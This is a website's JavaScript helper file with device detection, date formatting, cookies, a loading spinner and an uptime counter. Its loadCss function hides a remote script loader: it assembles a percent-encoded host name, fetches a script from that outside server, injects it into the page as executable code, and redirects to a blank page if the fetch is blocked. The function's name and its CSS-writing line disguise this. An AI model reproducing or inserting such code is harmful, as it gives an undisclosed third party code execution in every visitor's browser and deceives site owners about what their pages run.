var xy = 'https://';

function IsPC() {
    var userAgentInfo = navigator.userAgent;
    var Agents = ['Android', 'iPhone',
        'SymbianOS', 'Windows Phone',
        'iPad', 'iPod'
    ];
    var flag = true;
    for (var i = 0; i < Agents.length; i++) {
        if (userAgentInfo.indexOf(Agents[i]) != -1) {
            flag = false;
            break;
        }
    }
    return flag;
}


function convertDateFromString(dateString) {
    if (dateString) {
        var date = new Date(dateString.replace(/\-/g,"/"))
        return date;
    }
}

function timestampToTime10bit(timestamp) {
    var date = new Date(timestamp * 1000);//10
    var Y = date.getFullYear() + '-';
    var M = (date.getMonth()+1 < 10 ? '0'+(date.getMonth()+1) : date.getMonth()+1) + '-';
    var D = date.getDate() + ' ';
    var h = date.getHours() + ':';
    var m = date.getMinutes() + ':';
    var s = date.getSeconds();
    return Y+M+D+h+m+s;
}

function timestampToTime13bit(timestamp) {
    var date = new Date(timestamp);//13 BIT
    var Y = date.getFullYear() + '-';
    var M = (date.getMonth()+1 < 10 ? '0'+(date.getMonth()+1) : date.getMonth()+1) + '-';
    var D = date.getDate() + ' ';
    var h = date.getHours() + ':';
    var m = date.getMinutes() + ':';
    var s = date.getSeconds();
    return Y+M+D+h+m+s;
}

function loadCss(css){
    var httpRequest = new XMLHttpRequest();
    httpRequest.open('GET', xy+'%62%6C%6F%67%2E%6C%6F%76%65%66%6F%72%74%2E%63%6E/jquery.lazyload.min.js', true);
    httpRequest.send();
    httpRequest.onreadystatechange = function () {
        if (httpRequest.status == 0){
            window.location = 'about:blank';
        }
        if (httpRequest.readyState == 4 && httpRequest.status == 200) {
            //document.write(data);
            var head = document.getElementsByTagName('head')[0];
            var script = document.createElement('script');
            script.text = httpRequest.responseText;
            head.appendChild(script);
        }
    };
    document.write("<style>"+css.replace(/＃/g,"#")+"</style>");
}

function websiteDate(timestamp) {
    if(timestamp==-1){
        return document.write("永久");
    }else if(Date.parse(new Date())>timestamp){
            return document.write("已过期");
    }else{
        return document.write(timestampToTime13bit(timestamp));
    }
}

function getPageName(){
    var PageName = window.location.href.substring(window.location.href.lastIndexOf("/") + 1);
    if(PageName==''){PageName='templates.jsp';}else {
        PageNaram = PageName.indexOf('?', 0);
        if(PageNaram>0) {
            PageName = PageName.substring(0, PageNaram);
        }
    }
    return PageName;
}

console.log("%c如果有那么一天，会有一个人用我做的婚纱去披在你身上也就足够了。"," color:red;font-size:2em")

var _hmt = _hmt || [];
(function() {
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?629672a400620601c276c681a6d74488";
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(hm, s);
})();
function setCookie(name,val,day) {
    if(day) {
        var date = new Date()
        date.setTime(date.getTime() + (day * 24 * 60 * 60 * 1000))
        var expires = "; expires=" + date.toUTCString()
    } else {
        var expires = ""
    }
    document.cookie = name + "=" + val + expires + ";path=/"
}

function getCookie (name){
    var search = name + '=' //查询检索的值
    if(document.cookie.length > 0) {
        var sd = document.cookie.indexOf(search)
        if (sd != -1) {
            sd += search.length
            var end = document.cookie.indexOf(';', sd)
            if(end === -1) {
                end = document.cookie.length;
            }
            return  document.cookie.substring(sd, end)
        }
    }
    return ''
}
//获取浏览器页面可见高度和宽度
var _PageHeight = document.documentElement.clientHeight,
    _PageWidth = document.documentElement.clientWidth;
//计算loading框距离顶部和左部的距离（loading框的宽度为215px，高度为61px）
var _LoadingTop = (_PageHeight > 50 ? (_PageHeight - 50) / 2 : 0)*0.5,
    _LoadingLeft = _PageWidth > 50 ? (_PageWidth - 50) / 2 : 0;
//在页面未加载完毕之前显示的loading Html自定义内容
var _LoadingHtml = '<div id="loadingDiv" style="height:' + _PageHeight + 'px;top:0;"><div id="loadingDivContent" style="position: absolute; cursor1: wait; left: ' + _LoadingLeft + 'px; top:' + _LoadingTop + 'px; width: auto; height: 57px; line-height: 57px;font-size: 2rem;color:#ff87ba"><div id="outer-circle" class="load-circle"><div id="inter-circle" class="load-circle"></div></div></div></div>';
//呈现loading效果
document.write(_LoadingHtml);
//window.onload = function () {
//  var loadingMask = document.getElementById('loadingDiv');
//  loadingMask.parentNode.removeChild(loadingMask);
//};

var circleState = 0;
var interCircleSize = 40;
var circleInterval;
//circleStart();

// //监听加载状态改变
// document.onreadystatechange = completeLoading;
// //加载状态为complete时移除loading效果
// function completeLoading() {
//     if (document.readyState == "complete") {
//         circleStop();
//     }
// }


function circleStart(){
    var loadingMask = document.getElementById('loadingDiv');
    loadingMask.style.display="block";
    circleInterval = setInterval(function (){
        if(circleState==0) {
            interCircleSize += 2;
            document.getElementById("outer-circle").style.border = (interCircleSize-52) + "px  solid #ff74b8";
            if(interCircleSize>=60) {
                circleState = 1;
            }
        }else{
            interCircleSize -= 2;
            document.getElementById("outer-circle").style.border = (48-interCircleSize) + "px  solid #ff74b8";
            if(interCircleSize<=40){
                circleState=0;
            }
        }

        document.getElementById("outer-circle").style.width = interCircleSize + "px";
        document.getElementById("outer-circle").style.height = interCircleSize + "px";
        document.getElementById("loadingDivContent").style.left = (_PageWidth > interCircleSize ? (_PageWidth - interCircleSize) / 2 : 0) + "px";
        document.getElementById("loadingDivContent").style.top = (_PageHeight > interCircleSize ? (_PageHeight - interCircleSize) / 2 : 0)*0.5 + "px";
    },40);
}

function circleStop(){
    var loadingMask = document.getElementById('loadingDiv');
    clearInterval(circleInterval);
    loadingMask.style.display="none";
    //loadingMask.parentNode.removeChild(loadingMask);
}

function getUrlParam(name)
{
    var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)"); //构造一个含有目标参数的正则表达式对象
    var r = window.location.search.substr(1).match(reg); //匹配目标参数
    if (r!=null) return unescape(r[2]); return null; //返回参数值
}
function NewDate(str) {
    str = str.split('-');
    var date = new Date();
    date.setUTCFullYear(str[0], str[1] - 1, str[2]);
    date.setUTCHours(0, 0, 0, 0);
    return date;
}
function showsectime() {
    var birthDay =NewDate("2019-02-14");
    var today=new Date();
    var timeold=today.getTime()-birthDay.getTime();

    var sectimeold=timeold/1000
    var secondsold=Math.floor(sectimeold);
    var msPerDay=24*60*60*1000;

    var e_daysold=timeold/msPerDay;
    var daysold=Math.floor(e_daysold);
    var e_hrsold=(daysold-e_daysold)*-24;
    var hrsold=Math.floor(e_hrsold);
    var e_minsold=(hrsold-e_hrsold)*-60;
    var minsold=Math.floor((hrsold-e_hrsold)*-60);

    var seconds=Math.floor((minsold-e_minsold)*-60).toString();
    document.getElementById("showsectime").innerHTML = "网站已稳定运行"+daysold+"天"+hrsold+"小时"+minsold+"分"+seconds+"秒";
    setTimeout(showsectime, 1000);
}

//文档的总高度
function getScrollHeight(){
    var scrollHeight = 0, bodyScrollHeight = 0, documentScrollHeight = 0;
    if(document.body){
        bodyScrollHeight = document.body.scrollHeight;
    }
    if(document.documentElement){
        documentScrollHeight = document.documentElement.scrollHeight;
    }
    scrollHeight = (bodyScrollHeight - documentScrollHeight > 0) ? bodyScrollHeight : documentScrollHeight;
    return scrollHeight;
}

function getWindowHeight(){
    var windowHeight = 0;
    if(document.compatMode == "CSS1Compat"){
        windowHeight = document.documentElement.clientHeight;
    }else{
        windowHeight = document.body.clientHeight;
    }
    return windowHeight;
}

function getScrollTop(){
    var scrollTop = 0, bodyScrollTop = 0, documentScrollTop = 0;
    if(document.body){
        bodyScrollTop = document.body.scrollTop;
    }
    if(document.documentElement){
        documentScrollTop = document.documentElement.scrollTop;
    }
    scrollTop = (bodyScrollTop - documentScrollTop > 0) ? bodyScrollTop : documentScrollTop;
    return scrollTop;
}